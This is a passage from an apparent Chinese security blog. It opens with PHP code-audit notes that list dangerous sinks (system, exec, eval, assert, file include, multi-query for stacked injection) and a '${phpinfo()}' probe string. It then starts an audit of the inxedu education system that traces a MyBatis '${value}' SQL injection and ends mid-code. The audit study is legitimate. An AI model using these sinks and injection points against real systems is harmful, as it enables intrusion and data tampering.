href="#GLOBALS超全局变量组" class="headerlink" title="$GLOBALS超全局变量组"></a>$GLOBALS超全局变量组</h3><p>$GLOBALS 是PHP的一个超级全局变量组，在一个PHP脚本的全部作用域中都可以访问。</p><p>$GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$x</span> = <span class="hljs-number">75</span>; <br><span class="hljs-variable">$y</span> = <span class="hljs-number">25</span>;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addition</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function"></span>&#123; <br>    <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;z&#x27;</span>] = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;x&#x27;</span>] + <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;y&#x27;</span>]; <br>&#125;<br> <br><span class="hljs-title function_ invoke__">addition</span>(); <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$z</span>; <br></code></pre></td></tr></table></figure><h3 id="explode打散数组"><a href="#explode打散数组" class="headerlink" title="explode打散数组"></a>explode打散数组</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;Hello world. I love Shanghai!&quot;</span>;<br><span class="hljs-title function_ invoke__">print_r</span> (<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-variable">$str</span>));<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">Array</span> ( [<span class="hljs-number">0</span>] =&gt; Hello [<span class="hljs-number">1</span>] =&gt; world. [<span class="hljs-number">2</span>] =&gt; I [<span class="hljs-number">3</span>] =&gt; love [<span class="hljs-number">4</span>] =&gt; Shanghai! )<br></code></pre></td></tr></table></figure><h3 id="curl-setopt设置cURL"><a href="#curl-setopt设置cURL" class="headerlink" title="curl_setopt设置cURL"></a>curl_setopt设置cURL</h3><p><a href="https://www.runoob.com/php/func-curl_setopt.html">https://www.runoob.com/php/func-curl_setopt.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 创建一个新cURL资源</span><br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br><span class="hljs-comment">// 设置URL和相应的选项</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-string">&quot;http://www.example.com/&quot;</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">// 抓取URL并把它传递给浏览器</span><br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><br><span class="hljs-comment">//关闭cURL资源，并且释放系统资源</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="PHP-XML"><a href="#PHP-XML" class="headerlink" title="PHP XML"></a>PHP XML</h3><ul><li>libxml：用来解析XML文档的函数库</li><li>Libxml2.9以前的版本会默认支持并开启外部实体的引用</li></ul><p>PHP 使用 simplexml 函数来处理 XML。</p><p><a href="https://www.w3school.com.cn/php/php_ref_simplexml.asp">https://www.w3school.com.cn/php/php_ref_simplexml.asp</a></p><h3 id="请求参数"><a href="#请求参数" class="headerlink" title="请求参数"></a>请求参数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]<br><span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]<br><span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]<br><span class="hljs-variable">$_REQUEST</span>[GET|POST|COOKIE]<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]<span class="hljs-comment"># IP地址~XXF</span><br>getenv[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]<span class="hljs-comment"># IP地址~XXF</span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>] <span class="hljs-comment"># User-Agent</span><br><span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>)<span class="hljs-comment"># User-Agent</span><br>....<br></code></pre></td></tr></table></figure><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>连接 MySql：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>) <br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$servername</span>;&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br></code></pre></td></tr></table></figure><p>报错：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mysql_error</span>()<br><span class="hljs-title function_ invoke__">mysqli_connect_error</span>()<br><span class="hljs-title function_ invoke__">error_reporting</span>()<span class="hljs-comment"># 报错回显程度</span><br></code></pre></td></tr></table></figure><p>执行单条 SQL 语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>)<br><span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>)<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$sql</span>)<br></code></pre></td></tr></table></figure><p>执行多条 SQL语句 ：~ （ 堆叠注入 ）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>)<br><span class="hljs-title function_ invoke__">multi_query</span>(<span class="hljs-variable">$sql</span>)<br></code></pre></td></tr></table></figure><p>结果处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mysqli_affected_rows</span>(<span class="hljs-variable">$conn</span>)<span class="hljs-comment"># 获得前一次操作的所影响的行数</span><br><span class="hljs-title function_ invoke__">mysqli_fetch_all</span>(result)<span class="hljs-comment"># 从结果集中取出所有行作为关联或索引、混合数组</span><br><span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(result)<span class="hljs-comment"># 从结果集中取出所有行作为关联数组</span><br><span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(result)<span class="hljs-comment"># 从结果集中取出所有行作为索引数组</span><br><span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(result)<span class="hljs-comment"># 从结果集中取出所有行作为混合数组</span><br><span class="hljs-title function_ invoke__">mysqli_insert_id</span>(connection)<span class="hljs-comment"># 获得上一次insert操作的id</span><br><span class="hljs-title function_ invoke__">mysqli_num_rows</span>(result)<span class="hljs-comment"># 获得结果集中的记录条数</span><br></code></pre></td></tr></table></figure><p>转义函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-keyword">string</span>)<br><span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(connection,escapestring)<br><span class="hljs-title function_ invoke__">trim</span>() <span class="hljs-comment"># 移除两边预定义字符</span><br></code></pre></td></tr></table></figure><p>sql 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name;<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> table_name (column_name1,column_name2....) <span class="hljs-keyword">values</span> (<span class="hljs-keyword">value</span>,value...),(<span class="hljs-keyword">value</span>,value...)...;<br><span class="hljs-keyword">update</span> table_name <span class="hljs-keyword">set</span> column_name1<span class="hljs-operator">=</span>value1,column_name2<span class="hljs-operator">=</span>value2...;<br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> table_name; <br><span class="hljs-keyword">truncate</span> <span class="hljs-keyword">table</span> table_name;<br></code></pre></td></tr></table></figure><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>文件上传流程：</p><ul><li>客户端上传文件 –&gt; 服务端接收文件 –&gt; 网站程序判断 –&gt; 临时文件 –&gt; 移动到指定目录</li></ul><p>全局变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;file&quot;</span> - 表单input参数<br> <span class="hljs-keyword">__FILE__</span> - 是一个魔术常量，它会返回当前执行PHP脚本的完整路径和文件名。自PHP <span class="hljs-number">4.0</span>.<span class="hljs-number">2</span>版本起，它总是包含一个绝对路径。<br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] - 上传文件的名称<br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] - 上传文件的类型<br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] - 上传文件的大小，以字节计<br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>] - 存储在服务器的文件的临时副本的名称<br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] - 由文件上传导致的错误代码<br></code></pre></td></tr></table></figure><p>前端相关：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload_file.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>文件验证：（是否存在）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">is_dir</span>()<br><span class="hljs-title function_ invoke__">file_exists</span>()<br><span class="hljs-title function_ invoke__">is_file</span>()<br></code></pre></td></tr></table></figure><p>获取后缀：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">pathinfo</span>()|<span class="hljs-title function_ invoke__">end</span>()+<span class="hljs-title function_ invoke__">explode</span>()<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;x.y.z.png&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>, PATHINFO_EXTENSION);<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$file</span>)));<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309032245558.png" alt="image-20221022224217449"></p><p>文件移动：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">move_uploaded_file</span>()<br></code></pre></td></tr></table></figure><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>()<br><span class="hljs-keyword">require</span>()<br><span class="hljs-keyword">include_once</span>()<br><span class="hljs-keyword">require_once</span>()<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;filename&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;filename&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><p>PHP如何实现文件下载？</p><ul><li>使用header函数来发送相关信息给客户端浏览器，同时再结合filesize函数来读取文件大小并进行下载操作。</li></ul><p>header：文件类型 | 大小按bytes计算 | 文件大小 | 文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>)<br><span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Accept-Ranges: bytes&quot;</span>)<br><span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Accept-Length:&quot;</span>.<span class="hljs-variable">$file_size</span>)<br><span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span>.<span class="hljs-variable">$file_name</span>)<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filename</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$file_url</span> = <span class="hljs-string">&#x27;http://www.myremoteserver.com/file.exe&#x27;</span>;  <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);  <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Transfer-Encoding: Binary&quot;</span>);   <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-disposition: attachment; filename=\&quot;&quot;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file_url</span>) . <span class="hljs-string">&quot;\&quot;&quot;</span>);   <br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file_url</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;filename&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">fopen</span>() --&gt; <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;welcome.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-comment">// 打开文件</span><br><span class="hljs-title function_ invoke__">fclose</span>() --&gt; <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>) <span class="hljs-comment">// 关闭文件</span><br><span class="hljs-title function_ invoke__">fgets</span>() --&gt; <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-string">&quot;welcome.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-comment">// 逐行读取</span><br><span class="hljs-title function_ invoke__">fgetc</span>() --&gt; <span class="hljs-title function_ invoke__">fgetc</span>(<span class="hljs-variable">$file</span>) <span class="hljs-comment">// 逐字符读取</span><br>....<br></code></pre></td></tr></table></figure><h2 id="页面输出"><a href="#页面输出" class="headerlink" title="页面输出"></a>页面输出</h2><p>输出函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-keyword">print</span> <br>print_r <br><span class="hljs-keyword">echo</span> <br>sprintf <br><span class="hljs-keyword">die</span> <br>var_dump <br>var_export<br></code></pre></td></tr></table></figure><p>JS操作DOM：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">document</span>获取节点的基本方法<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;id&#x27;</span>);  <span class="hljs-comment">//通过id来获取元素,返回指定的唯一元素。</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;name&quot;</span>); <span class="hljs-comment">//通过name来获取元素，返回name=&#x27;name&#x27;的集合。</span><br>.<span class="hljs-property">document</span>.<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">&quot;classname&quot;</span>)  <span class="hljs-comment">//用classname来获取元素，返回的是一个class=&quot;classname&quot;的集合(不兼容IE8及以下)。</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;div&#x27;</span>); <span class="hljs-comment">//用元素的标签获取元素，返回所有标签=“div”的集合。</span><br></code></pre></td></tr></table></figure><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">system</span>(args)<br><span class="hljs-title function_ invoke__">passthru</span>(args)<br><span class="hljs-title function_ invoke__">exec</span>(args)<br><span class="hljs-title function_ invoke__">shell_exec</span>(args)<br><span class="hljs-title function_ invoke__">popen</span>(command,mode)<br></code></pre></td></tr></table></figure><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>()<br><span class="hljs-title function_ invoke__">assert</span>()<br><span class="hljs-title function_ invoke__">preg_replace</span>()<br><span class="hljs-title function_ invoke__">create_function</span>()<br><span class="hljs-title function_ invoke__">array_map</span>()<br><span class="hljs-string">&quot;$&#123;phpinfo()&#125;&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>因酷时代在线教育系统</title>
    <link href="/2023/08/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/inxedu/"/>
    <url>/2023/08/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/inxedu/</url>
    
    <content type="html"><![CDATA[<h1 id="因酷时代在线教育系统"><a href="#因酷时代在线教育系统" class="headerlink" title="因酷时代在线教育系统"></a>因酷时代在线教育系统</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>项目地址：</p><ul><li><a href="https://www.jb51.net/codes/537685.html">https://www.jb51.net/codes/537685.html</a></li></ul><p>测试环境：</p><ul><li>jdk：1.8</li><li>tomcat：8.5</li><li>mysql：5.5</li></ul><p>先导入 sql 文件：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291509287.png" alt="image-20230829150953240" style="zoom:67%;" /><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291511574.png" alt="image-20230829151118547" style="zoom:67%;" /><p>打开项目，修改项目结构，设置 jdk 为 1.8 （ 本身就是的不用设置 ）</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291513409.png" alt="image-20230829151353288"></p><p>构建 Maven：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291514760.png" alt="image-20230829151459594"></p><p>配置 tomcat：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291516707.png" alt="image-20230829151603611"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291516107.png" alt="image-20230829151624020"></p><p>修改配置文件：</p><blockquote><p>project.properties</p></blockquote><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291518970.png" alt="image-20230829151812818"></p><p>运行后会提示启动注解处理 ，点击启动即可：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291519747.png" alt="image-20230829151926724"></p><p>搭建成功：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291520760.png" alt="image-20230829152059487"></p><p>后台站点的账号密码为：admin&#x2F;111111</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>组件信息：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031334131.png" alt="image-20230903133454061" style="zoom:67%;" /><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031335333.png" alt="image-20230903133518300" style="zoom:67%;" /><p>存在漏洞的组件：</p><ul><li><code>mybatis </code></li></ul><h2 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h2><p>漏洞编号：CVE-2020-26945</p><p>漏洞版本：Mybatis &lt; 3.5.6 </p><p>不过并没有开启二级缓存，条件不符合，故不存在漏洞。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309031340731.png" alt="image-20230903134002674"></p><h2 id="单点漏洞"><a href="#单点漏洞" class="headerlink" title="单点漏洞"></a>单点漏洞</h2><h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><p>该系统使用 Mybatis，那么就有可能因为使用 <code>$&#123;&#125;</code> 而导致 SQL 注入。</p><h4 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><p>在 <code>src/main/resources/mybatis/inxedu</code> 目录下搜索  <code>$&#123;&#125;</code> ：</p><h5 id="删除收藏"><a href="#删除收藏" class="headerlink" title="删除收藏"></a>删除收藏</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 删除收藏 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteCourseFavoritesById&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span>&gt;</span><br>    DELETE FROM EDU_COURSE_FAVORITES WHERE ID  IN  ($&#123;value&#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span><br></code></pre></td></tr></table></figure><p>搜索 id 值获取方法位置，Ctrl + Alt + H 获取调用层次：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308291533772.png" alt="image-20230829153322739"></p><p>一步步跟上去，看看有没有对参数做一些过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">/<br>  删除课程收藏<br>  <span class="hljs-meta">@param</span> ids<br> /<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteCourseFavoritesById</span><span class="hljs-params">(String ids)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteCourseFavoritesById</span><span class="hljs-params">(String ids)</span> &#123;<br>    